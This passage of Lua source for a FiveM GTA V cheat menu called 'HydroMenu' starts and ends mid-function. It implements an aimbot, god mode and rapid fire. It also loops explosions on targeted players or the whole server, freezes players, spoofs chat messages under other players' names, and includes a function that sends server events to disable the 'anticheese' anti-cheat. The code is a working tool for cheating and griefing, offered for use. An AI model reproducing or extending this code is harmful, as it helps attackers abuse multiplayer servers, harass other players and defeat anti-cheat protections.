			    local x, y, z = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 30.0, GetEntityVelocity(PlayerPedId())[3]) - GetEntityCoords(PlayerPedId())

			    SetEntityVelocity(PlayerPedId(), x, y, z)
			end
		end

		if HydroVariables.MiscOptions.FlyingCars then
            for vehicle in EnumerateVehicles() do
                NetworkRequestControlOfEntity(vehicle)
                ApplyForceToEntity(vehicle, 3, 0.0, 0.0, 500.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
            end
		end

		if HydroVariables.MiscOptions.GlifeHack then
            for ped in EnumeratePeds() do
				if not IsPedAPlayer(ped) and ped ~= PlayerPedId() then
					Wait(1)
					RequestControlOnce(ped)
					SetEntityHealth(ped, 0)
					SetEntityCoords(ped, GetEntityCoords(PlayerPedId()))
				end
			end
		end

		if HydroVariables.OnlinePlayer.freezeplayer then
			local ped = GetPlayerPed(HydroVariables.OnlinePlayer.playertofreeze)

			if not HasAnimDictLoaded("reaction@shove") then
				RequestAnimDict("reaction@shove")
				while not HasAnimDictLoaded("reaction@shove") do
					Wait(0)
				end        
			end

			TaskPlayAnim(ped, "reaction@shove", "shoved_back", 8.0, -8.0, -1, 0, 0, false, false, false)
		end

		if HydroVariables.AllOnlinePlayers.freezeserver then
			ActivePlayers = GetActivePlayers()
			for i = 1, #ActivePlayers do
				if HydroVariables.AllOnlinePlayers.IncludeSelf and ActivePlayers[i] ~= PlayerId() then
					local ped = GetPlayerPed(ActivePlayers[i])
					FreezeEntityPosition(HydroVariables.OnlinePlayer.playertofreeze, true)
					ClearPedTasksImmediately(ped)
				elseif not HydroVariables.AllOnlinePlayers.IncludeSelf then
					local ped = GetPlayerPed(ActivePlayers[i])
					FreezeEntityPosition(HydroVariables.OnlinePlayer.playertofreeze, true)
					ClearPedTasksImmediately(ped)
				end
			end
		end
		
		if HydroVariables.AllOnlinePlayers.tugboatrainoverplayers then
			for i = 1, #GetActivePlayers() do
				if HydroVariables.AllOnlinePlayers.IncludeSelf and GetActivePlayers()[i] ~= PlayerId() then
					coords = GetEntityCoords(GetPlayerPed(GetActivePlayers()[i]))
					
					while not HasModelLoaded(GetHashKey("tug")) and not killmenu do
						RequestModel(GetHashKey("tug"))
						Wait(1)
					end
	
					CreateVehicle(GetHashKey("tug"), coords.x, coords.y, coords.z + 300.0, 90.0, 1, 1)	
				elseif not HydroVariables.AllOnlinePlayers.IncludeSelf then
					coords = GetEntityCoords(GetPlayerPed(GetActivePlayers()[i]))
					
					while not HasModelLoaded(GetHashKey("tug")) and not killmenu do
						RequestModel(GetHashKey("tug"))
						Wait(1)
					end
	
					CreateVehicle(GetHashKey("tug"), coords.x, coords.y, coords.z + 300.0, 90.0, 1, 1)	
				end
			end
		end
		
		if HydroVariables.WeaponOptions.RageBot then
			if IsDisabledControlPressed(0, 24) then
				for k in EnumeratePeds() do
					if k ~= PlayerPedId() then 
						RageShoot(k) 
					end
				end
			end
		end

		if HydroVariables.WeaponOptions.Spinbot and not noclipping then
			if GetEntityVelocity(PlayerPedId()) == vector3(0, 0, 0) then
				SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) + 20)
				for Ped in EnumeratePeds() do
					if Ped ~= PlayerPedId() and HasEntityClearLosToEntityInFront(PlayerPedId(), Ped) then
						x, y, z = table.unpack(GetEntityCoords(Ped)) 
						SetPedShootsAtCoord(PlayerPedId(), x, y, z, true)
						RageShoot(Ped)
					end
				end
			end
		end

		if HydroVariables.WeaponOptions.InfAmmo then
			if IsPedShooting(PlayerPedId()) then
				local __, weapon = GetCurrentPedWeapon(PlayerPedId())
				ammo = GetAmmoInPedWeapon(PlayerPedId(), weapon)
				SetPedAmmo(PlayerPedId(), weapon, ammo + 1)
			end
		end

		if HydroVariables.WeaponOptions.NoReload then
			if IsPedShooting(PlayerPedId()) then
				PedSkipNextReloading(PlayerPedId())
				MakePedReload(PlayerPedId())
			end
		end

		if HydroVariables.WeaponOptions.AimBot.Enabled then
			FOV = HydroVariables.WeaponOptions.AimBot.FOV

			--[[
			DrawRect(0.5 - FOV / 2, 0.5, 0.01, 0.515, 255, 80, 80, 100)
			DrawRect(0.5 + FOV / 2, 0.5, 0.01, 0.515, 255, 80, 80, 100)
			DrawRect(0.5, 0.5 - FOV / 1.2, 0.49, 0.015, 255, 80, 80, 100)
			DrawRect(0.5, 0.5 + FOV / 1.2, 0.49, 0.015, 255, 80, 80, 100)
			]]
	
			local success, PedAimingAt = GetEntityPlayerIsFreeAimingAt(PlayerId())
	
			if GetEntityType(PedAimingAt) == 1 then
				HydroVariables.WeaponOptions.AimBot.Targeting.LowestResult = { x = 0, y = 0}
				HydroVariables.WeaponOptions.AimBot.Targeting.Target = PedAimingAt
			end
	
			if IsPedDeadOrDying(HydroVariables.WeaponOptions.AimBot.Targeting.Target) then
				HydroVariables.WeaponOptions.AimBot.Targeting.Target = nil
				HydroVariables.WeaponOptions.AimBot.Targeting.LowestResult = { x = 1.0, y = 1.0}
			end
	
			for Ped in EnumeratePeds() do
				SuccessAimbot = true
				local x, y, z = table.unpack(GetEntityCoords(Ped))
				local _, _x, _y = World3dToScreen2d(x, y, z)

				if GetEntityModel(Ped) ~= 111281960 then
					if not IsPedDeadOrDying(Ped) then
						local _, _xx, _xy = World3dToScreen2d(table.unpack(GetEntityCoords(HydroVariables.WeaponOptions.AimBot.Targeting.Target)))
		
						if _x > 0.5 - FOV / 2 and _x < 0.5 + FOV / 2 and _y > 0.5 - FOV / 2 and _y < 0.5 + FOV / 2 then
							if Ped ~= PlayerPedId() then
								if HydroVariables.WeaponOptions.AimBot.OnlyPlayers then
									if IsPedAPlayer(Ped) then
										SuccessAimbot = true
									else
										SuccessAimbot = false
									end
								end
								if SuccessAimbot and HydroVariables.WeaponOptions.AimBot.InvisibilityCheck then
									if IsEntityVisible(Ped) then
										SuccessAimbot = true
									else
										SuccessAimbot = false
									end
								end
								if SuccessAimbot and HydroVariables.WeaponOptions.AimBot.IgnoreFriends then
									for i = 1, #FriendsList do
										pped = GetPlayerPed(FriendsList[i])
										if Ped == pped then
											SuccessAimbot = false
										end
									end
								end

								if SuccessAimbot then
									CrosshairCheck(Ped, _x, _y)
								end
							end
						end
						
						--HydroMenu.DrawRect(_xx, _xy, 0.06, 0.02 * HydroMenu.ScreenWidth / HydroMenu.ScreenHeight, { r = 20, g = 20, b = 255, a = 150 })
						
						if _xx > 0.5 - FOV / 2 and _xx < 0.5 + FOV / 2 and _xy > 0.5 - FOV / 2 and _xy < 0.5 + FOV / 2 then
							
						else
							HydroVariables.WeaponOptions.AimBot.Targeting.LowestResult = { x = 1.0, y = 1.0}
						end
					end
				end
			end
			
			if HydroVariables.WeaponOptions.AimBot.ShowTarget and HydroVariables.WeaponOptions.AimBot.Targeting.Target ~= nil then
				local wepent = GetCurrentPedWeaponEntityIndex(PlayerPedId())
				local launchPos = GetEntityCoords(wepent)

				DrawLine(launchPos, GetEntityCoords(HydroVariables.WeaponOptions.AimBot.Targeting.Target), HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
			end
	
			if IsEntityOnScreen(HydroVariables.WeaponOptions.AimBot.Targeting.Target) and IsPedShooting(PlayerPedId()) and IsPlayerFreeAiming(PlayerId()) then
				local coords = GetEntityCoords(HydroVariables.WeaponOptions.AimBot.Targeting.Target)
				RequestCollisionAtCoord(coords.x, coords.y, coords.z)
				
				ShootAtBone(HydroVariables.WeaponOptions.AimBot.Targeting.Target, HydroVariables.WeaponOptions.AimBot.Bone, 50)
			end

		end

		if HydroVariables.WeaponOptions.RapidFire then
            DoRapidFireTick()
		end
		
		if HydroVariables.WeaponOptions.BulletOptions.Enabled then
			if IsPedShooting(PlayerPedId()) then
				local _, weapon = GetCurrentPedWeapon(PlayerPedId())
				local wepent = GetCurrentPedWeaponEntityIndex(PlayerPedId())
				local launchPos = GetEntityCoords(wepent)
				local targetPos = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 200.0)
				local weaponbullet = HydroVariables.WeaponOptions.BulletOptions.WeaponBulletName
			
				ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, GetHashKey(weaponbullet), PlayerPedId(), true, true, 24000.0)
			end
		end

		if HydroVariables.WeaponOptions.TriggerBot then
			local hasTarget, target = GetEntityPlayerIsFreeAimingAt(PlayerId())
			
            if hasTarget and IsEntityAPed(target) then
				local boneTarget = GetPedBoneCoords(target, 0, 0.0, -0.2, 0.0)
				x, y, z = table.unpack(boneTarget)
				SetPedShootsAtCoord(PlayerPedId(), x, y, z, true)
            end
		end

		if HydroVariables.WeaponOptions.ExplosiveAmmo then
            local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
            if ret then
				AddExplosion(pos.x, pos.y, pos.z, 1, 1.0, 1, 0, 0.1)
            end
		end

		if HydroVariables.WeaponOptions.DelGun then
			if IsPlayerFreeAiming(PlayerId()) then
                local entity = getEntity(PlayerId())
                if GetEntityType(entity) == 2 or 3 then
                    if aimCheck(GetPlayerPed(-1)) then
                        SetEntityAsMissionEntity(entity, true, true)
                        DeleteEntity(entity)
                    end
                end
            end
		end

		if HydroVariables.WeaponOptions.OneShot then
			SetWeaponDamageModifier(GetSelectedPedWeapon(PlayerPedId()), 1000.0)
		else
			SetWeaponDamageModifier(GetSelectedPedWeapon(PlayerPedId()), 1.0)
		end
		
		if HydroVariables.SelfOptions.noragdoll then
			SetPedCanRagdoll(PlayerPedId(), false)
		else
			SetPedCanRagdoll(PlayerPedId(), true)
		end

		if HydroVariables.SelfOptions.superjump then
			SetSuperJumpThisFrame(PlayerId())
		end

		if HydroVariables.SelfOptions.MoonWalk then
			if IsDisabledControlPressed(0, 21) and IsDisabledControlPressed(0, 32) then
				forwardback = -9.8
			elseif IsPedWalking(PlayerPedId()) then
				forwardback = -3.6
			else
				forwardback = 0.0
			end

			local x, y, z = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, forwardback, GetEntityVelocity(PlayerPedId())[3]) - GetEntityCoords(PlayerPedId())

			SetEntityVelocity(PlayerPedId(), x, y, z)
		end
		
		if HydroVariables.OnlinePlayer.messagelooping then
			if NetworkIsPlayerConnected(HydroVariables.OnlinePlayer.messageloopplayer) then

				TriggerServerEvent("_chat:messageEntered", GetPlayerName(HydroVariables.OnlinePlayer.messageloopplayer), { 255, 255, 255 }, HydroVariables.OnlinePlayer.messagetosend)
				
			else

				HydroVariables.OnlinePlayer.messagelooping = false
				HydroVariables.OnlinePlayer.messageloopplayer = nil
				HydroVariables.OnlinePlayer.messagetosend = "."

			end
		end

		if HydroVariables.SelfOptions.disableobjectcollisions then
			for door in EnumerateObjects() do
				
				SetEntityCollision(door, false, true)

			end
		end

		if HydroVariables.SelfOptions.disablepedcollisions then
			for ped in EnumeratePeds() do
				if ped ~= PlayerPedId() and IsPedAPlayer(ped) ~= true then
					SetEntityCollision(ped, false, true)
				end
			end
		end

		if HydroVariables.SelfOptions.disablevehiclecollisions then
			local ped = PlayerPedId()

			for vehicle in EnumerateVehicles() do
			    SetEntityCollision(vehicle, false, true)
			end
		end

		if HydroVariables.SelfOptions.forceradar then
			DisplayRadar(true)
		end

		if HydroVariables.SelfOptions.playercoords then

			local entity = IsPedInAnyVehicle(PlayerPedId()) and GetVehiclePedIsIn(PlayerPedId(), false) or PlayerPedId()

			local coords = GetEntityCoords(PlayerPedId())
			local x = coords.x
			local y = coords.y
			local z = coords.z
			local h = GetEntityHeading(PlayerPedId())
			
			roundx = tonumber(string.format("%.2f", x))
			roundy = tonumber(string.format("%.2f", y))
			roundz = tonumber(string.format("%.2f", z))
			roundh = tonumber(string.format("%.2f", h))
			
			HydroMenu.DrawText("X: ~w~"..roundx, {0.01, 0.20 }, {HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255}, 0.5, 4, 0, 0, 1)
			HydroMenu.DrawText("Y: ~w~"..roundy, {0.01, 0.225 }, {HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255}, 0.5, 4, 0, 0, 1)
			HydroMenu.DrawText("Z: ~w~"..roundz, {0.01, 0.25 }, {HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255}, 0.5, 4, 0, 0, 1)
			HydroMenu.DrawText("Heading: ~w~"..roundh, {0.01, 0.275 }, {HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255}, 0.5, 4, 0, 0, 1)

		end
		 
		if HydroVariables.OnlinePlayer.MolotovWLoop then
			local coords = GetEntityCoords(GetPlayerPed(HydroVariables.OnlinePlayer.MolotovWPlayer))
			AddExplosion(coords.x, coords.y, coords.z, 3, 100.0, true, false, 0.0)
		end

		if HydroVariables.OnlinePlayer.HydrantPlayer then
			local coords = GetEntityCoords(GetPlayerPed(HydroVariables.OnlinePlayer.MolotovWPlayer))
			AddExplosion(coords.x, coords.y, coords.z, 13, 100.0, true, false, 0.0)
		end

		if HydroVariables.SelfOptions.godmode then
			SetPedCanRagdoll(PlayerPedId(), false)
			ClearPedBloodDamage(PlayerPedId())
			ResetPedVisibleDamage(PlayerPedId())
			ClearPedLastWeaponDamage(PlayerPedId())
			SetEntityProofs(PlayerPedId(), true, true, true, true, true, true, true, true)
			SetEntityOnlyDamagedByPlayer(PlayerPedId(), false)
			SetEntityCanBeDamaged(PlayerPedId(), false)
		end

		if HydroVariables.SelfOptions.AutoHealthRefil then
			SetEntityHealth(PlayerPedId(), 200)
		end

		if HydroVariables.SelfOptions.AntiHeadshot then
			SetPedSuffersCriticalHits(PlayerPedId(), false)
		end

		if HydroVariables.SelfOptions.invisiblitity then
            SetEntityVisible(PlayerPedId(), false, true)
		end

		if HydroVariables.OnlinePlayer.FlingingPlayer then
			local coords = GetEntityCoords(GetPlayerPed(HydroVariables.OnlinePlayer.FlingingPlayer))
		
			ShootSingleBulletBetweenCoords(AddVectors(coords, vector3(0, 0, 0.1)), coords, 0.0, true, GetHashKey("WEAPON_RAYPISTOL"), PlayerPedId(), true, true, 100)
		end

		if HydroVariables.OnlinePlayer.MolotovLoop then

			local ped = GetPlayerPed(HydroVariables.OnlinePlayer.MolotovPlayer)
			local pedcoords = GetEntityCoords(ped)

			RequestNamedPtfxAsset("core")
			
			UseParticleFxAssetNextCall("core")
			StartNetworkedParticleFxNonLoopedAtCoord("exp_air_molotov", pedcoords, 0.0, 0.0, 0.0, 10.0, false, false, false, false)
		
		end

		if HydroVariables.OnlinePlayer.FireWorkLoop then

			local ped = GetPlayerPed(HydroVariables.OnlinePlayer.FireWorkPlayer)

			RequestNamedPtfxAsset("scr_indep_fireworks")
		    
			local pedcoords = GetEntityCoords(ped)

			UseParticleFxAssetNextCall("scr_indep_fireworks")
			StartNetworkedParticleFxNonLoopedAtCoord("scr_indep_firework_trailburst", pedcoords, 0.0, 0.0, 0.0, 1.0, false, false, false, false)
		
		end

		if HydroVariables.OnlinePlayer.FireWork2Loop then

			local ped = GetPlayerPed(HydroVariables.OnlinePlayer.FireWork2Player)

			RequestNamedPtfxAsset("proj_indep_firework_v2")
		    
			local pedcoords = GetEntityCoords(ped)

			UseParticleFxAssetNextCall("proj_indep_firework_v2")
			StartNetworkedParticleFxNonLoopedAtCoord("scr_firework_indep_ring_burst_rwb", pedcoords, 0.0, 0.0, 0.0, 10.0, false, false, false, false)
		
		end

		if HydroVariables.OnlinePlayer.SmokeLoop then

			local ped = GetPlayerPed(HydroVariables.OnlinePlayer.SmokePlayer)

			RequestNamedPtfxAsset("scr_agencyheist")
		    
			local pedcoords = GetEntityCoords(ped)

			UseParticleFxAssetNextCall("scr_agencyheist")
			StartNetworkedParticleFxNonLoopedAtCoord("scr_fbi_dd_breach_smoke", pedcoords, 0.0, 0.0, 0.0, 10.0, false, false, false, false)
		
		end

		if HydroVariables.OnlinePlayer.JesusLightLoop then

			local ped = GetPlayerPed(HydroVariables.OnlinePlayer.JesusPlayer)

			RequestNamedPtfxAsset("scr_rcbarry1")
		    
			local pedcoords = GetEntityCoords(ped)

			UseParticleFxAssetNextCall("scr_rcbarry1")

			StartNetworkedParticleFxNonLoopedAtCoord("scr_alien_teleport", pedcoords, 0.0, 0.0, 0.0, 10.0, false, false, false, false)
		
		end

		if HydroVariables.OnlinePlayer.AlienLightLoop then

			local ped = GetPlayerPed(HydroVariables.OnlinePlayer.AlienPlayer)

			RequestNamedPtfxAsset("scr_rcbarry2")
		    
			local pedcoords = GetEntityCoords(ped)

			UseParticleFxAssetNextCall("scr_rcbarry2")

			StartNetworkedParticleFxNonLoopedAtCoord("scr_clown_appears", pedcoords, 0.0, 0.0, 0.0, 10.0, false, false, false, false)
		
		end

		if HydroVariables.OnlinePlayer.ExplosionParticlePlayer then

			local ped = GetPlayerPed(HydroVariables.OnlinePlayer.ExplosionParticlePlayer)

			RequestNamedPtfxAsset("scr_exile1")
		    
			local pedcoords = GetEntityCoords(ped)

			UseParticleFxAssetNextCall("scr_exile1")
			StartNetworkedParticleFxNonLoopedAtCoord("scr_ex1_plane_exp_sp", pedcoords, 0.0, 0.0, 0.0, 10.0, false, false, false, false)
		
		end

		if TazeLoop then

			local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
			RequestCollisionAtCoord(coords.x, coords.y, coords.z)
			ShootSingleBulletBetweenCoords(coords.x, coords.y, coords.z, coords.x, coords.y, coords.z + 2, 0, true, "WEAPON_STUNGUN", ped, false, false, 100)

		end

		if HydroVariables.WeaponOptions.Crosshair and not (cam) then
			local success, PedAimingAt = GetEntityPlayerIsFreeAimingAt(PlayerId())
	
			DrawRect2(HydroMenu.ScreenWidth / 2 - 2, HydroMenu.ScreenHeight / 2 - 7, 3, 13, 0, 0, 0, 255)
			DrawRect2(HydroMenu.ScreenWidth / 2 - 7, HydroMenu.ScreenHeight / 2 - 2, 13, 3, 0, 0, 0, 255)
			DrawRect2(HydroMenu.ScreenWidth / 2 - 1, HydroMenu.ScreenHeight / 2 - 6, 1, 11, 255, 255, 255, 255)
			DrawRect2(HydroMenu.ScreenWidth / 2 - 6, HydroMenu.ScreenHeight / 2 - 1, 11, 1, 255, 255, 255, 255)

		end

		Wait(0)
		
	end
end)

function CrosshairCheck(Ped, x, y)
	if x < 0.0 then
		x = x * -1
	end
	if y < 0.0 then
		y = y * -1
	end
	if HydroVariables.WeaponOptions.AimBot.ThroughWalls then
		if x < HydroVariables.WeaponOptions.AimBot.Targeting.LowestResult.x and y < HydroVariables.WeaponOptions.AimBot.Targeting.LowestResult.y then
			HydroVariables.WeaponOptions.AimBot.Targeting.LowestResult.x = x
			HydroVariables.WeaponOptions.AimBot.Targeting.Target = Ped
		end
	elseif HasEntityClearLosToEntityInFront(PlayerPedId(), Ped) then
		if x < HydroVariables.WeaponOptions.AimBot.Targeting.LowestResult.x and y < HydroVariables.WeaponOptions.AimBot.Targeting.LowestResult.y then
			HydroVariables.WeaponOptions.AimBot.Targeting.LowestResult.x = x
			HydroVariables.WeaponOptions.AimBot.Targeting.Target = Ped
		end
	end
end

function DrawRect2(x, y, w, h, r, g, b, a)
    local _w, _h = w / HydroMenu.ScreenWidth, h / HydroMenu.ScreenHeight
    local _x, _y = x / HydroMenu.ScreenWidth + _w / 2, y / HydroMenu.ScreenHeight + _h / 2
    Citizen.InvokeNative(0x3A618A217E5154F0,_x, _y, _w, _h, r, g, b, a)
end

function NativeExplosionServerLoop()
    Citizen.CreateThread(function()
        while HydroVariables.AllOnlinePlayers.ExplodisionLoop do
			OnlinePlayers = GetActivePlayers()
			Wait(250)
			for i = 1, #OnlinePlayers do
				if HydroVariables.AllOnlinePlayers.IncludeSelf and OnlinePlayers[i] ~= PlayerId() then
					local ped = GetPlayerPed(OnlinePlayers[i])
					local coords = GetEntityCoords(ped)
					AddExplosion(coords.x, coords.y, coords.z, 29, 100.0, true, false, 0.0)
				elseif not HydroVariables.AllOnlinePlayers.IncludeSelf then
					local ped = GetPlayerPed(OnlinePlayers[i])
					local coords = GetEntityCoords(ped)
					AddExplosion(coords.x, coords.y, coords.z, 29, 100.0, true, false, 0.0)
				end
			end
		end
    end)
end

function NativeExplosionLoop()
    Citizen.CreateThread(function()
		while HydroVariables.OnlinePlayer.ExplosionLoop do
			Wait(1)
			local ped = GetPlayerPed(HydroVariables.OnlinePlayer.ExplodingPlayer)
			local coords = GetEntityCoords(ped)
			AddExplosion(coords.x, coords.y, coords.z, HydroVariables.OnlinePlayer.ExplosionType, 100.0, true, false, 0.0)
		end
    end)
end

function ShootAtCoords(coords, weapon)
    ShootSingleBulletBetweenCoords(AddVectors(coords, vector3(0, 0, 0.1)), 0, GetWeaponDamage(weapon, 1), true, weapon, PlayerPedId(), true, true, 1000.0)
end

function GetVelocityAimbot(entity)
	vel = GetEntityVelocity(entity)
	vel = vel[2]
	if vel < 0 then
		vel = vel * -1
	end
	vel = vel / 2
	return vel
end

function DoRapidFireTick()
    DisablePlayerFiring(PlayerPedId(), true)
    if IsDisabledControlPressed(0, 257) and IsPlayerFreeAiming(PlayerId()) then
        local _, weapon = GetCurrentPedWeapon(PlayerPedId())
        local wepent = GetCurrentPedWeaponEntityIndex(PlayerPedId())
        local launchPos = GetEntityCoords(wepent)
        local targetPos = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 200.0)
    
        ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
        ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
    end
end

function ShootAtBone(target, bone, damage)
	local bone = GetEntityBoneIndexByName(target, bone)
	local velocity = GetVelocityAimbot(target)
	local boneTarget = GetPedBoneCoords(target, bone, 0.0, -0.2, 0.0)
	local boneTarget2 = GetPedBoneCoords(target, bone, 0.0, 0.2 + velocity, 0.0)
	local _, weapon = GetCurrentPedWeapon(PlayerPedId())
    ShootSingleBulletBetweenCoords(boneTarget, boneTarget2, damage, true, weapon, PlayerPedId(), true, true, 100.0)
end

function getEntity(player) 
	local _, entity = GetEntityPlayerIsFreeAimingAt(player)
	return entity
end

function aimCheck(player)
    if onAim == "true" then
        return true
    else
        return IsPedShooting(player)
	end
end
	
function HelpAlert(msg)
    SetTextComponentFormat("STRING")
    AddTextComponentString(msg)
    DisplayHelpTextFromStringLabel(0,0,1,-1)
end

-- How To Use
-- local clientid, serverid = HydroMenu.GetPlayerFromPedId(ped) 

function HydroMenu.GetPlayerFromPedId(ped) 
	PlayerList = GetActivePlayers()
	for i = 1, #PlayerList do
		local playerped = GetPlayerPed(PlayerList[i])
		if playerped == ped then
			return i, GetPlayerServerId(PlayerList[i])
		end
	end
	return false
end

function TogPoliceHeadlights()
	Citizen.CreateThread(function()
		while not killmenu do
			if not policeheadlights then
					local veh = GetVehiclePedIsUsing(PlayerPedId())
					ToggleVehicleMod(veh, 22, true)
					SetVehicleHeadlightsColour(veh, 0)
                return
			end
			Wait(500)
			local veh = GetVehiclePedIsUsing(PlayerPedId())
			ToggleVehicleMod(veh, 22, true) -- toggle xenon
			SetVehicleHeadlightsColour(veh, 1)
			Wait(500)
			SetVehicleHeadlightsColour(veh, 8)
		end
	end)
end

local Keybinds = {
	{ 0x30, "0", false }, 
	{ 0x31, "1", false }, 
	{ 0x32, "2", false }, 
	{ 0x33, "3", false }, 
	{ 0x34, "4", false }, 
	{ 0x35, "5", false }, 
	{ 0x36, "6", false }, 
	{ 0x37, "7", false }, 
	{ 0x38, "8", false }, 
	{ 0x39, "9", false }, 
	{ 0x41, "A", false }, 
	{ 0x42, "B", false }, 
	{ 0x43, "C", false }, 
	{ 0x44, "D", false }, 
	{ 0x45, "E", false }, 
	{ 0x46, "F", false }, 
	{ 0x47, "G", false }, 
	{ 0x48, "H", false }, 
	{ 0x49, "I", false }, 
	{ 0x4A, "J", false }, 
	{ 0x4B, "K", false }, 
	{ 0x4C, "L", false }, 
	{ 0x4D, "M", false }, 
	{ 0x4E, "N", false }, 
	{ 0x4F, "O", false }, 
	{ 0x50, "P", false }, 
	{ 0x51, "Q", false }, 
	{ 0x52, "R", false }, 
	{ 0x53, "S", false }, 
	{ 0x54, "T", false }, 
	{ 0x55, "U", false }, 
	{ 0x56, "V", false }, 
	{ 0x57, "W", false }, 
	{ 0x58, "X", false }, 
	{ 0x59, "Y", false }, 
	{ 0x5A, "Z", false }, 
	{ 0x20, " ", false }, 
	{ 0xBD, "_", false }
}


function HydroMenu.KeyboardEntry(title, maxchar)
	if HydroMenu.UI.GTAInput then
        local GTAINPUT = KeyboardEntry(title, maxchar)
		return GTAINPUT
	end

	Wait(30)
	local OneUsed = 0
	local FlashThing = 0
	local Input = ""

	if maxchar > 188 then
        maxchar = 188
	end

	for i = 1, #Keybinds do
		Keybinds[i][3] = false
	end

	while true do

		DisableAllControlActions(0)

		HydroMenu.DrawRect(0.5, 0.56, 0.5, 0.04, { r = 20, g = 20, b = 20, a = 200 })
		HydroMenu.DrawRect(0.5, 0.52, 0.5, 0.04, { r = 0, g = 0, b = 0, a = 200 })
		HydroMenu.DrawRect(0.5, 0.54, 0.5, 0.001, { r = HydroMenu.rgb.r, g = HydroMenu.rgb.g, b = HydroMenu.rgb.b, a = 200 })

		HydroMenu.DrawText("[ WHO MENU ] ~w~" .. title, {0.252, 0.5025}, {HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255}, 0.5, 4, 0)
		HydroMenu.DrawText(Input .. "_", {0.252, 0.54}, {255, 255, 255, 255}, 0.5, 4, 0, "HydroTextBox")

		if IsDisabledControlJustPressed(1, 194) and #Input > 0 then
			Input = Input:sub(1, #Input - 1)
		end

		if Ham.getKeyState(0x10) ~= 0 or Ham.getKeyState(0x14) ~= 0 then
			for i = 1, #Keybinds do
				local pressed = Ham.getKeyState(Keybinds[i][1])
				if pressed ~= 0 then
					if not Keybinds[i][3] then
						Input = Input .. string.upper(Keybinds[i][2])
					end
					Keybinds[i][3] = true
				else
					Keybinds[i][3] = false
				end
			end
		else
			for i = 1, #Keybinds do
				local pressed = Ham.getKeyState(Keybinds[i][1])
				if pressed ~= 0 then
					if not Keybinds[i][3] then
						Input = Input .. string.lower(Keybinds[i][2])
					end
					Keybinds[i][3] = true
				else
					Keybinds[i][3] = false
				end
			end
		end

		if IsDisabledControlJustPressed(1, 191) then
			for i = 1, #Keybinds do
				Keybinds[i][3] = false
			end
			return Input
		end
		
		if OneUsed < 5 then
			OneUsed = OneUsed + 1
			Input = ""
		end

		Wait(0)
	end
end

function AlienColourSpam()
	Citizen.CreateThread(function()
		while HydroVariables.SelfOptions.AlienColorSpam do
			SetPedComponentVariation(PlayerPedId(), 0, 0, 0, 0)
			SetPedComponentVariation(PlayerPedId(), 1, 134, 8, 0)
			SetPedComponentVariation(PlayerPedId(), 2, 0, 0, 0)
			SetPedComponentVariation(PlayerPedId(), 3, 13, 0, 0)
			SetPedComponentVariation(PlayerPedId(), 4, 106, 8, 0)
			SetPedComponentVariation(PlayerPedId(), 8, 274, 8, 0)
			SetPedComponentVariation(PlayerPedId(), 11, 274, 8, 0)
			SetPedComponentVariation(PlayerPedId(), 6, 83, 8, 0)
	
			SetPedPropIndex(PlayerPedId(), 1, 0, 0, 0)

			Wait(30)

			SetPedComponentVariation(PlayerPedId(), 0, 0, 0, 0)
			SetPedComponentVariation(PlayerPedId(), 1, 134, 9, 0)
			SetPedComponentVariation(PlayerPedId(), 2, 0, 0, 0)
			SetPedComponentVariation(PlayerPedId(), 3, 13, 0, 0)
			SetPedComponentVariation(PlayerPedId(), 4, 106, 9, 0)
			SetPedComponentVariation(PlayerPedId(), 8, 274, 9, 0)
			SetPedComponentVariation(PlayerPedId(), 11, 274, 9, 0)
			SetPedComponentVariation(PlayerPedId(), 6, 83, 9, 0)
	
			SetPedPropIndex(PlayerPedId(), 1, 0, 0, 0)

			Wait(30)
		end
	end)	
end

function KeyboardEntry(title, maxchar)
	result = ""
	if result == "" then 
		AddTextEntry('TITLETEXT', title)
	   	DisplayOnscreenKeyboard(1, "TITLETEXT", "", "", "", "", "", maxchar)
	end

	while (UpdateOnscreenKeyboard() == 0) do
		DisableAllControlActions(0)
		Wait(250)		
	end

	if (GetOnscreenKeyboardResult()) then
		result = GetOnscreenKeyboardResult()
		CancelOnscreenKeyboard()
	end

	if not HasModelLoaded(GetHashKey(result)) then
		RequestModel(GetHashKey(result))
		Wait(500)
	end
				
	CancelOnscreenKeyboard()

	return result
end

local function EnumerateEntities(initFunc, moveFunc, disposeFunc) return coroutine.wrap(function() local iter, id = initFunc() if not id or id == 0 then disposeFunc(iter) return end local enum = {handle = iter, destructor = disposeFunc} setmetatable(enum, entityEnumerator) local next = true repeat coroutine.yield(id) next, id = moveFunc(iter) until not next enum.destructor, enum.handle = nil, nil disposeFunc(iter) end) end
function EnumerateVehicles() return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle) end
function EnumerateObjects() return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject) end
function EnumeratePeds() return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed) end

function RampAllCars()
	for vehicle in EnumerateVehicles() do
		local ramp = CreateObject(GetHashKey("stt_prop_stunt_track_start"), 0, 0, 0, true, true, true)
		NetworkRequestControlOfEntity(vehicle)
		if DoesEntityExist(vehicle) then
			AttachEntityToEntity(ramp, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
		end
		NetworkRequestControlOfEntity(ramp)
		SetEntityAsMissionEntity(ramp, true, true)
	end
end

function DisableAnticheat(anticheat)
	if string.find(anticheat, "anticheese") then
		TriggerServerEvent("anticheese:SetComponentStatus", "Teleport", false)
		TriggerServerEvent("anticheese:SetComponentStatus", "GodMode", false)
